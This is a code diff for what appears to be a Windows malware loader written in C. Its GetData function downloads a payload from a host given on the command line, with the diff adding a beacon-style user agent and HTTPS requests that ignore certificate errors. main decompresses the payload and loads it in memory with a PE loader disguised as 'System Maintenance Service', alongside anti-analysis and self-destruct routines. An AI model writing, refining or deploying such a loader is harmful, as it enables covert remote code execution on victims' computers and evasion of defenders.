@@ -48,7 +48,7 @@ typedef struct {
     size_t len;
 } DATA;
 
-// === LZSS DECOMPRESSOR (Okumura - en memoria, sin archivos) ===
+// === LZSS DECOMPRESSOR (Okumura - in memory) ===
 #define EI 11
 #define EJ  4
 #define P   1
@@ -247,7 +247,7 @@ BOOL anti_analysis() {
 
     return FALSE;
 }
-
+// Puff
 void selfDestruct() {
     printf("[*] Initiating self-destruct...\n");
     fflush(stdout);
@@ -674,27 +674,39 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
     size_t buffer_capacity = 0;
     size_t buffer_size = 0;
 
-    // Log para depuración
-    {
-        char resourceA[1024] = {0};
-        WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);
-        printf("[*] Descargando: %ls (%s)\n", wresource, resourceA);
-    }
+    // Log
+    char resourceA[1024] = {0};
+    WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);
+    wprintf(L"[*] Downloading: %s (%s)\n", wresource, resourceA);
 
-    HINTERNET hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    HINTERNET hSession = WinHttpOpen(L"Black Basalt Beacon/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
+                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) {
         printf("[-] WinHttpOpen failed (%u)\n", GetLastError());
         return data;
     }
 
-    HINTERNET hConnect = WinHttpConnect(hSession, whost, port, 0);
+    HINTERNET hConnect = WinHttpConnect(hSession, whost, (USHORT)port, 0);
     if (!hConnect) {
         printf("[-] WinHttpConnect failed (%u)\n", GetLastError());
         WinHttpCloseHandle(hSession);
         return data;
     }
 
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    // Determinar si es HTTPS
+    BOOL is_https = (port == 443);
+    DWORD flags = is_https ? WINHTTP_FLAG_SECURE : 0;
+
+    HINTERNET hRequest = WinHttpOpenRequest(
+        hConnect,
+        L"GET",
+        wresource,
+        NULL,
+        WINHTTP_NO_REFERER,
+        WINHTTP_DEFAULT_ACCEPT_TYPES,
+        flags
+    );
+
     if (!hRequest) {
         printf("[-] WinHttpOpenRequest failed (%u)\n", GetLastError());
         WinHttpCloseHandle(hConnect);
@@ -702,7 +714,17 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
         return data;
     }
 
-    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
+    // Ignorar errores de certificado si es HTTPS
+    if (is_https) {
+        DWORD sec_flags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+                          SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+                          SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+                          SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags));
+    }
+
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
         printf("[-] WinHttpSendRequest failed (%u)\n", GetLastError());
         WinHttpCloseHandle(hRequest);
         WinHttpCloseHandle(hConnect);
@@ -721,29 +743,24 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
     DWORD dwSize = 0;
     while (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
         char* pszOutBuffer = (char*)malloc(dwSize + 1);
-        if (!pszOutBuffer) {
-            printf("[-] malloc failed\n");
-            break;
-        }
-        ZeroMemory(pszOutBuffer, dwSize + 1);
+        if (!pszOutBuffer) break;
 
+        ZeroMemory(pszOutBuffer, dwSize + 1);
         DWORD dwDownloaded = 0;
         if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded)) {
-            printf("[-] WinHttpReadData failed (%u)\n", GetLastError());
             free(pszOutBuffer);
             break;
         }
 
         if (buffer_size + dwDownloaded > buffer_capacity) {
-            size_t new_capacity = (buffer_size + dwDownloaded) * 2;
-            unsigned char* new_buffer = (unsigned char*)realloc(buffer, new_capacity);
-            if (!new_buffer) {
-                printf("[-] realloc failed\n");
+            size_t new_cap = (buffer_size + dwDownloaded) * 2;
+            unsigned char* tmp = (unsigned char*)realloc(buffer, new_cap);
+            if (!tmp) {
                 free(pszOutBuffer);
                 break;
             }
-            buffer = new_buffer;
-            buffer_capacity = new_capacity;
+            buffer = tmp;
+            buffer_capacity = new_cap;
         }
 
         memcpy(buffer + buffer_size, pszOutBuffer, dwDownloaded);
@@ -752,21 +769,23 @@ DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
         dwSize = 0;
     }
 
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
     if (buffer_size == 0) {
-        printf("[-] No data downloaded\n");
+        printf("[-] No data received\n");
+        if (buffer) free(buffer);
     } else {
         data.data = malloc(buffer_size);
         if (data.data) {
             memcpy(data.data, buffer, buffer_size);
             data.len = buffer_size;
-            printf("[+] Descargado: %zu bytes\n", buffer_size);
+            printf("[+] Downloaded %zu bytes\n", buffer_size);
         }
+        free(buffer);
     }
 
-    if (buffer) free(buffer);
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
     return data;
 }
 
@@ -794,10 +813,10 @@ int main(int argc, char** argv) {
     wchar_t* wresource = (wchar_t*)malloc(len * sizeof(wchar_t));
     MultiByteToWideChar(CP_UTF8, 0, resource, -1, wresource, len);
 
-    printf("\n[+] Descargando payload de %s:%d/%s\n", host, port, resource);
+    printf("\n[+] Downloading payload  %s:%d/%s\n", host, port, resource);
     DATA payload = GetData(whost, port, wresource);
     if (!payload.data || payload.len < 12) {
-        printf("[-] Error al descargar el payload\n");
+        printf("[-] Error downloading payload\n");
         goto cleanup;
     }
 
@@ -832,7 +851,7 @@ int main(int argc, char** argv) {
     sz_masqCmd_Ansi = "System Maintenance Service"; // mejor camuflaje
     PELoader((char*)decompressed, (DWORD)decompSize);
 
-    printf("\n[+] Finalizado\n");
+    printf("\n[+] End\n");
 
 cleanup:
     free(whost);
